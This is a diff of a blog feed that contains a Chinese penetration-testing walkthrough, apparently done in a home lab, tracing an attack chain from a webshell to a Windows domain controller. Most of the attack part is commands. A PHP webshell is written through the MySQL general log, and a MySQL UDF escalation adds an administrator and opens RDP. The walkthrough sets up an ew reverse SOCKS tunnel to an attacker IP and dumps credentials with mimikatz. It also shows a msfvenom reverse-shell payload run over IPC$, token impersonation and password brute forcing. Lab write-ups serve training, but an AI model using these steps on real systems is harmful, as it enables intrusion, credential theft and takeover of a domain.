 <h4 id="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！"><a href="#大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config-php，利用日志记录将一句话写进去，这样就能变相写入文件了！" class="headerlink" title="大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！"></a>大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set global general_log=&apos;on&apos;;</div><div class="line">set global general_log_file=&apos;G:/apm/apache2/htdocs/config.php&apos;;</div><div class="line">select &quot;&lt;?php ($_=@$_GET[a]).@$_($_POST[&apos;cmd&apos;]); ?&gt;&quot;;</div><div class="line">set global general_log=off;</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519111553_ytsySz_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519111553_ytsySz_Screenshot.jpeg" alt=""></p>
 <h4 id="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"><a href="#既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！" class="headerlink" title="既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！"></a>既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！</h4><blockquote>
 <p>url = <a href="http://192.168.1.106/config.php?a=assert" target="_blank" rel="external">http://192.168.1.106/config.php?a=assert</a>  post=cmd</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519112536_9JPgYj_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519112536_9JPgYj_Screenshot.jpeg" alt=""></p>
 <h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03. 数据库提权"></a>0x03. 数据库提权</h2><h4 id="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。"><a href="#既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf-dll文件写到G-apm-Mysql-lib-plugin-目录下，还要有一个可供外部连接的数据库账号。" class="headerlink" title="既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。"></a>既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。</h4><h4 id="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"><a href="#写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！" class="headerlink" title="写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！"></a>写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;test&apos;@&apos;%&apos; IDENTIFIED BY &apos;mysqltoor&apos; WITH GRANT OPTION; </div><div class="line">FLUSH PRIVILEGES;</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519113453_p5Fe1K_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519113558_iSlUo0_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113453_p5Fe1K_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519113558_iSlUo0_Screenshot.jpeg" alt=""></p>
 <h4 id="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"><a href="#现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！" class="headerlink" title="现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！"></a>现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div><div class="line">select cmdshell(&apos;net user test admin@123 /add&apos;);</div><div class="line">select cmdshell(&apos;net localgroup administrators /add test&apos;);</div><div class="line">drop function cmdshell;</div><div class="line"></div><div class="line">Create Function open3389 returns string soname &apos;udf.dll&apos;;</div><div class="line">select open3389();</div><div class="line">drop function open3389;</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519114403_RJqz70_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519114403_RJqz70_Screenshot.jpeg" alt=""></p>
 <h2 id="0x04-建立隧道"><a href="#0x04-建立隧道" class="headerlink" title="0x04. 建立隧道"></a>0x04. 建立隧道</h2><h4 id="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"><a href="#虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！" class="headerlink" title="虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！"></a>虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 攻击者在公网IP上 运行：</div><div class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 8888  //在公网上侦听1080端口，并把来自1080端口的流量重定向到8888端口</div><div class="line"># 受害者运行:</div><div class="line">ew_for_Win.exe -s rssocks -d [攻击者公网IP] -e 8888   </div><div class="line"># 然后 vim /etc/proxychains.conf 配置代理文件为：</div><div class="line">socks5 [攻击者公网IP] 1080     </div><div class="line"># 最后利用proxychains 执行命令</div><div class="line">proxychains rdesktop [受害者IP]:3389</div><div class="line">###################################</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519120038_IAO2LB_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519120254_Dzvr86_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519120601_zj3thc_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120038_IAO2LB_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120254_Dzvr86_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519120601_zj3thc_Screenshot.jpeg" alt=""></p>
 <h2 id="0x05-密码窃取"><a href="#0x05-密码窃取" class="headerlink" title="0x05. 密码窃取"></a>0x05. 密码窃取</h2><h4 id="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin"><a href="#我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin" class="headerlink" title="我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@"></a>我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">sekurlsa::logonpasswords</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519121717_XCuZPm_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519121717_XCuZPm_Screenshot.jpeg" alt=""></p>
 <h4 id="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"><a href="#拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！" class="headerlink" title="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"></a>拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 收集域名信息</div><div class="line">net view  						//获取当前组的计算机名字</div><div class="line">net view /domain   			//查看所有域</div><div class="line">ping -n 1 [组计算机明] -4  	//从计算机名获取IP 地址</div><div class="line">net user /domain				//查看域中的用户名</div><div class="line">net group /domain				//查看域组名称</div><div class="line">net group &quot;Domain Admins&quot; /domain     				//查询管理员</div><div class="line">net group &quot;Domain controllers&quot;  /domain           //查询域控</div><div class="line">net group &quot;Domain Computers&quot; /domain				//查询所有计算机名字</div><div class="line">net config Workstation								//查看当前计算机名、全名、用户名、系统版本、工作站域、登录域</div><div class="line">net group &quot;Domain controllers&quot; 						//查看域控制器</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">net user admin Ad123test /add /domain	  			//添加普通域用户</div><div class="line">net group &quot;Domain Admins&quot; admin /add /domain 		//提升到域管理员</div><div class="line">###################################</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519141307_QYTX7T_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519141307_QYTX7T_Screenshot.jpeg" alt=""></p>
 <h4 id="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。"><a href="#上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。" class="headerlink" title="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。"></a>上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。</h4><h2 id="0x06-IPC-入侵"><a href="#0x06-IPC-入侵" class="headerlink" title="0x06. IPC$ 入侵"></a>0x06. IPC$ 入侵</h2><h4 id="这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell"><a href="#这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell" class="headerlink" title="这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell."></a>这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 -f exe -o msf.exe	\\利用msf生成木马</div><div class="line">net use \\dmember1\ipc$                 //建立ipc$空连接</div><div class="line">copy c:\msf.exe \\dmember1\c$\msf.exe		//拷贝木马到目标机器上面去</div><div class="line">net time \\dmember1						//查看目标的时间</div><div class="line">at \\dmember1 2:35 %path%\msf.exe		//利用at任务执行木马，记住删除任务</div><div class="line">###################################</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519143905_hSTWQg_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519143905_hSTWQg_Screenshot.jpeg" alt=""></p>
 <h4 id="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"><a href="#现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。" class="headerlink" title="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"></a>现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">run</div></pre></td></tr></table></figure>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519144432_cknEUr_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519144432_cknEUr_Screenshot.jpeg" alt=""></p>
 <h2 id="0x07-获取域控"><a href="#0x07-获取域控" class="headerlink" title="0x07. 获取域控"></a>0x07. 获取域控</h2><h4 id="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"><a href="#当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…" class="headerlink" title="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"></a>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use incognito </div><div class="line">list_tokens –u #列出可用token，假如找到域控token </div><div class="line">impersonate_token lab\\administrator</div></pre></td></tr></table></figure>
-<h4 id="下面我换一种方式得到域控的shell："><a href="#下面我换一种方式得到域控的shell：" class="headerlink" title="下面我换一种方式得到域控的shell："></a>下面我换一种方式得到域控的shell：</h4><h4 id="首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上"><a href="#首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上" class="headerlink" title="首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上"></a>首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519154516_dBVly7_Screenshot.jpeg" alt=""></p>
+<h4 id="下面我换一种方式得到域控的shell："><a href="#下面我换一种方式得到域控的shell：" class="headerlink" title="下面我换一种方式得到域控的shell："></a>下面我换一种方式得到域控的shell：</h4><h4 id="首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上"><a href="#首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上" class="headerlink" title="首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上"></a>首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519154516_dBVly7_Screenshot.jpeg" alt=""></p>
 <h4 id="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"><a href="#接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！" class="headerlink" title="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"></a>接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！</h4><blockquote>
 <p>ipccrack.bat dcserver admin$ password.txt</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519160306_EFdL1v_Screenshot.jpeg" alt=""></p>
-<h4 id="账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透"><a href="#账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透" class="headerlink" title="账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透"></a>账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180519161150_GlFrvt_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519160306_EFdL1v_Screenshot.jpeg" alt=""></p>
+<h4 id="账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透"><a href="#账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透" class="headerlink" title="账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透"></a>账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519161150_GlFrvt_Screenshot.jpeg" alt=""></p>
 <h2 id="0x08-结语"><a href="#0x08-结语" class="headerlink" title="0x08. 结语"></a>0x08. 结语</h2><h4 id="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："><a href="#此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：" class="headerlink" title="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："></a>此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：</h4><h4 id="网盘链接-密码-fcxx"><a href="#网盘链接-密码-fcxx" class="headerlink" title="网盘链接:  密码:fcxx"></a><a href="https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ" target="_blank" rel="external">网盘链接:</a>  密码:fcxx</h4>]]></content>
     
     <summary type="html">
@@ -123,54 +123,54 @@
     <link href="http://TimeS0ng.github.io/2018/05/15/win2003-%E4%B8%8B%E6%90%AD%E5%BB%BAApache2-PHP5-Mysql-phpMyAdmin/"/>
     <id>http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/</id>
     <published>2018-05-15T10:26:18.000Z</published>
-    <updated>2018-05-16T02:49:02.840Z</updated>
+    <updated>2018-12-18T15:34:31.729Z</updated>
     
